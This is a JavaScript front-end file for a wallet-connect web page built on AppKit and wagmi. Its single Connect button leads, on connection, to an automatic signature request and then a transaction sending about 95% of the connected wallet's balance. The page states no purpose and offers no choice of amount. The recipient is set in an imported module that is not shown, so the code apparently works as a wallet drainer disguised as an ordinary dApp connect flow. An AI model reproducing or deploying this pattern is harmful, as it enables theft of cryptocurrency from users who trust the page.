import { appKit, wagmiAdapter } from './config/appKit'
import { store } from './store/appkitStore'
import { updateTheme } from './utils/dom'
import { signMessage, sendTx, getBalanceWei } from './services/wallet'
import showToast from './utils/toasts'
import { initializeSubscribers } from './utils/suscribers'

// Initialize subscribers (keeps store up-to-date)
initializeSubscribers(appKit)

// Utility to update loader/feedback UI
const setLoaderVisible = (visible) => {
  const c = document.getElementById('loaderContainer')
  if (!c) return
  c.className = visible ? 'loader-visible' : 'loader-hidden'
}

// status: 'info' | 'success' | 'error'
const setFeedback = (msg, status = 'info') => {
  const el = document.getElementById('liveFeedback')
  if (!el) return
  el.textContent = msg
  el.classList.remove('info', 'success', 'error')
  el.classList.add(status)

  const spinner = document.getElementById('spinner')
  const statusIcon = document.getElementById('statusIcon')
  if (!spinner || !statusIcon) return

  if (status === 'info') {
    spinner.style.display = ''
    spinner.style.borderTopColor = '#000'
    statusIcon.style.display = 'none'
    statusIcon.innerHTML = ''
  } else if (status === 'success') {
    spinner.style.display = 'none'
    statusIcon.style.display = 'flex'
    statusIcon.innerHTML = `\
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\
        <circle cx="12" cy="12" r="10" stroke="#16a34a" stroke-width="2"/>\
        <path d="M7.5 12.5l2.5 2.5 6-6" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\
      </svg>`
  } else if (status === 'error') {
    spinner.style.display = 'none'
    statusIcon.style.display = 'flex'
    statusIcon.innerHTML = `\
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\
        <circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="2"/>\
        <path d="M15 9L9 15M9 9l6 6" stroke="#dc2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\
      </svg>`
  }
}

// Modal helpers for arc spinner
const showModal = (message, status = 'info') => {
  const modal = document.getElementById('statusModal')
  const modalMsg = document.getElementById('modalMessage')
  const modalStatus = document.getElementById('modalStatus')
  const arc1 = document.getElementById('arc1')
  const arc2 = document.getElementById('arc2')
  const arc3 = document.getElementById('arc3')
  const arcSpinner = document.getElementById('arcSpinner')
  if (!modal || !modalMsg || !modalStatus || !arc1 || !arc2 || !arc3 || !arcSpinner) return

  modal.classList.remove('modal-hidden')
  modal.classList.add('modal-visible')
  modalMsg.textContent = message
  modalStatus.textContent = ''
  modalStatus.className = 'modal-status'
  if (status === 'success') modalStatus.classList.add('success')
  if (status === 'error') modalStatus.classList.add('error')

  // reset animations
  arc1.classList.remove('animate', 'arc-rotating')
  arc2.classList.remove('animate', 'arc-rotating')
  arc3.classList.remove('animate', 'arc-rotating')

  // trigger draw animations with stagger
  void arc1.offsetWidth
  arc1.classList.add('animate')
  setTimeout(() => arc2.classList.add('animate'), 120)
  setTimeout(() => arc3.classList.add('animate'), 240)

  // after draws, continue rotating
  setTimeout(() => {
    arc1.classList.add('arc-rotating')
    arc2.classList.add('arc-rotating')
    arc3.classList.add('arc-rotating')
  }, 1200)
}

const hideModal = () => {
  const modal = document.getElementById('statusModal')
  if (!modal) return
  modal.classList.remove('modal-visible')
  modal.classList.add('modal-hidden')
}

// Single Connect button behavior
const connectBtn = document.getElementById('connect-button')
connectBtn?.addEventListener('click', () => {
  // Open the AppKit connect modal
  appKit.open()
  // immediate feedback for connect modal
  setLoaderVisible(true)
  setFeedback('Awaiting wallet selection — choose a wallet to connect', 'info')
  showToast('info', 'Connect', 'Choose a wallet to connect')
})

let handledAddress = null

// React to account changes: when address appears, start loader and request signature
appKit.subscribeAccount(async (accountState) => {
  if (!accountState || !accountState.address) return

  const address = accountState.address
  // Avoid re-running for same address
  if (handledAddress === address) return
  handledAddress = address

  // Update button state
  if (connectBtn) {
    connectBtn.textContent = 'Connected'
    connectBtn.disabled = true
  }

  // Show loader + live feedback
  setLoaderVisible(true)
  setFeedback(`Connected: ${address}. Preparing signature request...`, 'info')

  try {
    // small progress updates
    await new Promise(r => setTimeout(r, 650))
    setFeedback('Requesting signature — please approve in your wallet', 'info')
    showToast('info', 'Signature', 'Please approve the signature in your wallet')

    const signature = await signMessage(store.eip155Provider, address)
    setFeedback('Signature received — approved', 'success')
    showToast('success', 'Signature Approved', 'Thank you — now preparing transaction')

    // display signature to console and to user
    console.log('Signature:', signature)
    // brief pause so user sees signature success
    await new Promise(r => setTimeout(r, 700))

    // compute balance and send 95% (reserve 5% for gas)
    setLoaderVisible(true)
    setFeedback('Fetching balance to calculate send amount...', 'info')
    try {
      const balanceWei = await getBalanceWei(store.eip155Provider, address)
      console.log('Balance (wei):', balanceWei.toString())
      // reserve 5% for gas => send 95% of balance
      const amountToSend = (balanceWei * 95n) / 100n
      if (amountToSend <= 0n) {
        setFeedback('Insufficient balance to send after reserving gas.', 'error')
        setTimeout(() => setLoaderVisible(false), 1000)
      } else {
        // display human-friendly amounts
        setFeedback(`Sending ${amountToSend.toString()} wei (~95% of balance). Please confirm in wallet.`, 'info')
        const tx = await sendTx(store.eip155Provider, address, wagmiAdapter, amountToSend)
        console.log('Transaction result:', tx)
        const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
        setFeedback(`Transaction submitted: ${txHash}`, 'success')
        showToast('success', 'Transaction Submitted', txHash.toString())
        setTimeout(() => setLoaderVisible(false), 1400)
      }
    } catch (txErr) {
      console.error('Transaction error', txErr)
      setFeedback('Transaction failed — see console', 'error')
      showToast('error', 'Transaction Failed', String(txErr?.message || txErr))
      setTimeout(() => setLoaderVisible(false), 1200)
    }
  } catch (err) {
    console.error('Signature error', err)
    setFeedback('Signature failed — see console', 'error')
    setTimeout(() => setLoaderVisible(false), 900)
  }
})

// Set initial theme if available
try { updateTheme(store.themeState.themeMode) } catch (e) {}
